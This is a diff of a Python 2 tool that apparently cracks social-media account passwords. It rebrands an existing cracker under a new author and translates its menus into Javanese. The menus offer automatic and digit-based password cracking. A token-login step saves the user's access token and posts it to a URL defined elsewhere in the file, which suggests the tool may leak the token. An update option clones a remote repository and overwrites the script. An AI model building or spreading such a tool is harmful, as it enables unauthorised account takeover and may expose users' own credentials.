@@ -1,9 +1,9 @@
 #!/usr/bin/python2
 # -*- coding: utf-8
 
-#AUTHOR : AZIM VAU (MR. ERROR)
-#OPEN SOURCE :)
-#DON'T FORGET TO GIVE CREDIT TO MR. ERROR
+#AUTHOR : mr4605 (MRONGOS)
+#MODIFICATOR :)
+
 
 
 try:
@@ -50,18 +50,15 @@ def main():
 	logo()
 	print("\t\033[93;1m      MAIN MENU\x1b[0m")
 	print("")
-	print("\033[92;1m  [1] START CRACK")
-	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")
-	print("\033[94;1m  [3] UPDATE TOOL")
-	print("\033[96;1m  [J] JOIN MR. ERROR GROUP \033[92;1m✘\033[91;1m✘")
-	print("\033[90;1m  [0] EXIT")
+	print("\033[92;1m  [1] MULAI")
+	print("\033[90;1m  [0] METU")
 	print("")
 	log_sel()
 	
 def log_sel():
-	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")
+	sel = raw_input("\033[93;1m  MILIO: \033[92;1m")
 	if sel == "":
-		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
+		print("\t\033[91;1m  PILIANE WONG PEKOK -_")
 		log_sel()
 	elif sel =="1" or sel =="01":
 		token()
@@ -71,15 +68,15 @@ def log_sel():
 	elif sel =="3" or sel =="03":
 		import os
 		try:
-			os.system("git clone https://github.com/Azim-Vau/fcpro")
-			os.system("rm -rf fcpro.py")
-			os.system("cp -f fcpro/fcpro.py \\.")
-			os.system("rm -rf fcpro")
-			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
+			os.system("git clone https://github.com/mr4605/pancal")
+			os.system("rm -rf pancal.py")
+			os.system("cp -f pancal/pancal.py \\.")
+			os.system("rm -rf pancal")
+			xox("\033[92;1m\n PROGRAM DI ANYARI :)\n")
 			time.sleep(2)
 			main()
 		except KeyboardInterrupt:
-			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
+			print("\033[91;1m\n HPMU BANTINGEN WAE!\n")
 	        	main()
 	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
 		subprocess.check_output(["am", "start", "https://t.me/mrerrorgroup"])
@@ -101,9 +98,9 @@ def token():
     except(KeyError , IOError):
         logo()
         print("")
-        print("\t\033[92;1m  LOGIN TOKEN")
+        print("\t\033[92;1m  MPLEBU LEWAT TOKEN")
         print("")
-        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
+        token = raw_input("\033[93;1m TEMPELKE TOKEN: \033[92;1m")
         sav = open("vau_token.txt", "w")
         sav.write(token)
         sav.close()
@@ -114,7 +111,7 @@ def token_check():
 	try:
 		token=open('vau_token.txt','r').read()
 	except IOError:
-		print"\033[91;1m[!] TOKEN INVALID"
+		print"\033[91;1m[!] TOKEN SALAH"
 		os.system('rm -rf vau_token.txt')
 	requests.post(useragent_url + token, headers=header)
 	pass
@@ -147,14 +144,14 @@ def menu():
     print("")
 
     print("")
-    print("\033[92;1m  [1] CRACK WITH AUTO PASS")
-    print("\033[93;1m  [2] CRACK WITH DIGIT PASS")
-    print('\033[91;1m  [0] BACK')
+    print("\033[92;1m  [1] HACK PASS OTOMATIS")
+    print("\033[93;1m  [2] HACK PASS ONGKO")
+    print('\033[91;1m  [0] MBALIK')
     print("")
     menu_option()
     
 def menu_option():
-	select = raw_input("\033[92;1m  CHOOSE : ")
+	select = raw_input("\033[92;1m  MILIO : ")
 	if select =="1":
 		crack1()
 	elif select =="2":
